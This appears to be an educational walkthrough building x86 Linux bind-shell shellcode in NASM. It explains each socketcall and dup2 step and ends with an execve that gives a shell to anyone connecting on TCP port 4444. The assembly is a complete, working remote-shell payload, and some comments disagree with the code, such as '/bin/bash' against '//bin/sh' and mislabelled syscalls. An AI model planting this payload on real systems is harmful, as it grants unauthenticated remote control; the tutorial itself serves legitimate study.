; Author: Bobby Cooke

global _start

0. Corresponding System Calls to C Functions
    At the Assembly level, these C functions are all called with the same System Call, 102 - "socketcall": 
			socket(), bind(), connect(), listen(), accept() 
    Finding the SYSCAL Number: cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep "socket"
 					#define __NR_socketcall		102
    To differentiate between, for example, a socket() and bind() function, a corresponding value is held in EBX.
    These Values can be found with: cat /usr/include/linux/net.h. The values we need are listed below.
	#define SYS_SOCKET      1               /* sys_socket(2)                */
	#define SYS_BIND        2               /* sys_bind(2)                  */
	#define SYS_CONNECT     3               /* sys_connect(2)               */
	#define SYS_LISTEN      4               /* sys_listen(2)                */
	#define SYS_ACCEPT      5               /* sys_accept(2)                */
 Like all System Calls Linux, they are triggered when the Assembly instruction "int 0x80" is executed.
  At the time of the interrupt 0x80, the value stored in the EAX register determines which system call is called. 
   From above, we see the 5 C funtions we need all use the same system call at the Assembly level. 102 - "socketcall"
   Therefor for all functions, EAX will hold the value 102 (0x66 in Hex) everytime.
   The system call "socketcall" will know what to do (create a socket, listen, accept incoming connection, etc), 
   	based on the value stored in the EBX register. 
   The arguments of the C level function will be stored, declared by the value in EBX, will be in an array.
	This array is nothing more than consecutive values of the arguments stored one after another in a memory space.;	The memory space we will use is the Stack. Since Stack Memory grows from high memory to low memory, we will
	 need to store this array of values in reverse order.
	Once we have pushed our array of consecutive arguments onto the stack (in reverse order), all we need to 
	 do is simply point the ECX register to the top of the stack. 

 1. Create a Socket
    Default C Function:  int socket(int domain, int type, int protocol);
    Our C Function:	  int ipv4Socket = socket( AF_INET, SOCK_STREAM, 0 );
					    EBX     ECX[0]   ECX[1]     ECX[2]	     
	EAX = 102 = 0x66 // This is the value to call the SYSCAL "socketcall". We will use this for all the functions. 
	EBX = 1 = 0x1    // Value for socket() function relative to the SYSCAL "socketcall".
				#define SYS_SOCKET      1          // sys_socket(2)
	ECX[0] = AF_INET = 2 = 0x2
 		Find value of AF_INET: cat /usr/include/i386-linux-gnu/bits/socket.h | grep AF_INET
				#define AF_INET         PF_INET    // We see that AF_INET is mapped to PF_INET
		Find value of PF_INET: cat /usr/include/i386-linux-gnu/bits/socket.h | grep PF_INET
				#define PF_INET         2          // IP protocol family.
	ECX[1] = SOCK_STREAM = 1 = 0x1
 		Find value of SOCK_STREAM: cat /usr/src/linux-headers-$(uname -r)/include/linux/net.h | grep SOCK_STREAM
				SOCK_STREAM	= 1,
	ECX[2] = 0 = 0x0 // The value "0" is only option for the variable "int protocol"; for a TCP Socket.

```nasm
	xor eax, eax   	 ; This sets the EAX Register to NULL (all zeros).
	mov al, 0x66   	 ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
	xor ebx, ebx   	 ; This sets the EBX Register to NULL (all zeros).
	mov bl, 0x1    	 ; EBX is set to create a socket
	xor ecx, ecx   	 ; This sets the ECX Register to NULL (all zeros).
	push ecx       	 ; ECX[2]. ECX is NULL, the value needed for the first argument we need to push onto the stack
	push ebx       	 ; ECX[1]. EBX already has the value we need for ECX[1] we will simply use it to push the value 1.
	push dword 0x2 	 ; ECX[0]. Push the value 2 onto the stack, needed for AF_INET.
	mov ecx, esp   	 ; ECX now holds the pointer to the beginning of the Argument array stored on the stack.
	int 0x80       	 ; System Call Interrupt 0x80 - Executes socket(). Create the Socket.
  xchg esi, eax  	 ; After the SYSCAL, sockfd is stored in the EAX Register. Move it to the ESI Register; we will need it later.
```

2. Create IP-Socket Address and Bind the IP-Socket Address to the Socket.
    Default C Function:	int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    Our C Function:		bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));
                       	EBX   ECX[0]			ECX[1]			ECX[2]
       EAX = 102 = 0x66 // This is the value to call the SYSCAL "socketcall". We will use this for all the functions. 
       EBX = 2 = 0x2    // Value for socket() function relative to the SYSCAL "socketcall".
			        #define SYS_BIND        2          // sys_bind(2) 
       ECX[0] = int sockfd = ESI 		// The Socket we created earlier and stored in the ESI register 
       ECX[1] = const struct sockaddr *addr 	// This will point to the Struct (array of variables) we will store onto
						    the Stack.
       ECX[2] = sizeof(ipSocketAddr)		// The Binary Length of the Struct we will store in ECX[1]
 This System Call is tricky because we will need to have an array within an array.
  ECX[1] will point to the start of an array of 3 variables.
   We will push these 3 variables onto the stack first, then we will push ECX[2], ECX[1], and finally ECX[0].
 This is the struct we used in C to store the IP-Socket Address values used for the bind() function call:
  struct sockaddr_in ipSocketAddr = { .sin_family = AF_INET, .sin_port = htons(4444), .sin_addr.s_addr = INADDR_ANY };
				         	 ARG[0]                 ARG[1]                         ARG[2]
	ARG[0] = AF_INET = 0x2 			// We know this value from the last SYSCAL we did.
	ARG[1] = htons(4444) =  0x5c11		// All this means is "4444" in Hex (0x115C), in reversei; since 
							everything pushed to the Stack needs to be in reverse.
	ARG[2] = INADDR_ANY = 0x00000000	// All Network Interfaces		
		Find value for INADDR_ANY: cat /usr/src/linux-headers-$(uname -r)/include/uapi/linux/in.h | grep INADDR_ANY
				#define INADDR_ANY ((unsigned long int) 0x00000000)
 The order to push all this on the stack will be:
	ARG[2] > ARG[1] > ARG[0] > ECX[2] > ECX[1] > ECX[0]

```nasm
  xor eax, eax      ; This sets the EAX Register to NULL (all zeros).
  mov al, 0x66      ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
  xor ebx, ebx      ; This sets the EBX Register to NULL (all zeros).
  mov bl, 0x2       ; EBX is set to create a socket
  xor edx, edx      ; This sets the EDX Register to NULL (all zeros).
  push edx          ; ARG[2]. EDX is NULL, the value needed for INADDR_ANY.
  push word 0x5c11  ; ARG[1]. This is for the TCP Port 4444.
  push bx           ; ARG[0]. Push the value 2 onto the stack, needed for AF_INET.
	xor ecx, ecx	    ; This sets the EAX Register to NULL (all zeros).
	mov ecx, esp	    ; Save the memory location of ARG[0] into the EDX Register. We will use this for ECX[1].
	push 0x10	        ; ECX[2]. Our Struct of ARG's is now 16 bytes long (0x10 in Hex). 
	push ecx	        ; ECX[1]. The pointer to the beginning of the struct we saved is now loaded up for ECX[1].
	push esi	        ; ECX[0]. This is the value we saved from creating the Socket earlier. 
	mov ecx, esp	    ; Now all that is left is to point ECX to the top of the loaded stack and let it do it's thing.
  int 0x80	        ; System Call Interrupt 0x80 - Executes bind(). Connecting our Socket to the TCP-IP Address.
```

3. Listen for incoming connections on Socket at IP-Socket Address.
    Default C Function:	int listen(int sockfd, int backlog);
    Our C Function:		listen( ipv4Socket, 0 );
                               EBX      ECX[0]   ECX[1]
       EAX = 102 = 0x66		// This is the value to call the SYSCAL "socketcall". 
       EBX = 4 = 0x4			// Value for listen() function relative to the SYSCAL "socketcall".
			        		#define SYS_LISTEN      4          // sys_listen(2)
       ECX[0] = int sockfd = ESI	// The Socket we created earlier and stored in the ESI register 
       ECX[1] = 0x0 	 		// We have no need for a backlog so this value will be 0.

```nasm
  xor eax, eax     ; This sets the EAX Register to NULL (all zeros).
  mov al, 0x66     ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
  xor ebx, ebx     ; This sets the EBX Register to NULL (all zeros).
  mov bl, 0x4      ; EBX is set to listen().
  xor ecx, ecx     ; This sets the ECX Register to NULL (all zeros).
	push ecx	       ; ECX[1]. Push the value 0x0 to the stack.
  push esi         ; ECX[0]. This is the value we saved from creating the Socket earlier. 
  mov ecx, esp     ; Point ECX to the top of the stack. 
  int 0x80         ; Executes listen(). Allowing us to handle incoming TCP-IP Connections.
```

4. Accept the incoming connection on the listening Socket and create a new, connected socket for client.
    Default C Function: 	int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
    Our C Function:            int clientSocket = accept( ipv4Socket, NULL, NULL );
                               		    EBX     ECX[0]    ECX[1] ECX[2]
       EAX = 102 = 0x66                // This is the value to call the SYSCAL "socketcall".
       EBX = 5   = 0x5                 // Value for accept() function relative to the SYSCAL "socketcall".
						#define SYS_ACCEPT      5         // sys_accept(2)
       ECX[0] = int sockfd = ESI       // The Socket we created earlier and stored in the ESI register
       ECX[1] = NULL = 0x00000000
       ECX[2] = NULL = 0x00000000
       
```nasm
  xor eax, eax     ; This sets the EAX Register to NULL (all zeros).
  mov al, 0x66     ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
  xor ebx, ebx     ; This sets the EBX Register to NULL (all zeros).
  mov bl, 0x5      ; EBX is set to accept().
  xor ecx, ecx     ; This sets the ECX Register to NULL (all zeros).
  push ecx         ; ECX[2]. Push the value 0x0 to the stack.
  push ecx         ; ECX[1]. Push the value 0x0 to the stack.
  push esi         ; ECX[0]. This is the value we saved from creating the Socket earlier. 
  mov ecx, esp     ; Point ECX to the top of the stack. 
  int 0x80         ; System Call Interrupt 0x80 - Executes accept(). Allowing us to create connected Sockets. 
  xchg ebx, eax	   ; The created clientSocket is stored in EAX after receiving a successful connection.
```

 5. Duplicate Standard Input, Standard Output, and Standard Error File-Descriptors to the newly created, connected Socket.
    Default C Function:        int dup2(int oldfd, int newfd);
    Our C Function:            dup2( clientSocket, 0 ); // STDIN
 			        dup2( clientSocket, 1 ); // STDOUT
				dup2( clientSocket, 2 ); // STDERR
                		EAX       EBX      ECX 
       EAX = 63 = 0x3F			//  This is the value to call the SYSCAL "dup2".
		Find Dup2 SYSCAL value: cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup2
						#define __NR_dup2                63
       EBX = int oldfd = clientSocket		// Already set with "xchg ebx, eax" after the execution of accept().
       ECX = 2 & 1 & 0 = 0x2 & 0x1 & 0x0	// Since we need to do this SYSCAL 3 times, we will use a loop.
```nasm
  xor eax, eax     ; This sets the EAX Register to NULL (all zeros).
	xor ecx, ecx	   ; This sets the ECX Register to NULL (all zeros). 
	mov cl, 0x2	     ; This sets the loop counter & will also be the value of "int newfd" for the 3 dup2 SYSCAL's.
dup2Loop:		       ; Procedure label for the dup2 Loop.
  mov al, 0x3f     ; EAX is now 0x0000003F = SYSCALL 63 - dup2
  int 0x80         ; System Call Interrupt 0x80 - Executes accept(). Allowing us to create connected Sockets. 
	dec ecx		       ; Decrements ECX by 1 
	jns dup2Loop	   ; Jump back to the dup2Loop Procedure until ECX equals 0.
```

6. Spawn a bash shell for the client in the newly created, connected Socket that has Input, Output, and Error output.
    Default C Function:       int execve(const char *filename, char *const argv[], char *const envp[]); 
    Our C Function:           execve("/bin/bash", NULL, NULL);
 Execve SysCall: In the newly created socket, execute a shell. - See "man 2 execve" for full details.
	int execve(const char *filename, char *const argv[], char *const envp[]);
 	Values in C program : execve("/bin/bash", NULL, NULL);
 	EAX = int execve() // System Call Number for execve
		user$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep execve
			#define __NR_execve		 11	
		EAX = 11
	EBX = const char *filename // Pointer to string in memory storing "/bin/bash" + NULL Terminated
				   //	NULL Terminated ends the string "0x00"
		EBX = address of string ("/bin/bash" + "0x00")
	ECX = char *const argv[]   // Array of argument strings passed to the new program.
				   // 	The first string should be a pointer to "/bin/bash".
				   //		 	#1 = Address of "/bin/bash" in memory
				   // 			#2 = DWORD (32bit) NULL = 0x00000000
		ECX = [ memory address of string "/bin/bash", 0x00000000 ]
	EDX =  char *const envp[]  // Array of strings which are passed as environment to the new program.
		EDX = 0x00000000
    
```nasm
	push edx 	        ; NULL
	push 0x68732f2f	  ; "hs//"
	push 0x6e69622f   ; "nib/"
	mov ebx, esp	    ; point ebx to stack
	mov ecx, edx	    ; NULL
	mov al, 0xb	      ; execve System Call Number
	int 0x80	        ; execute execve
```
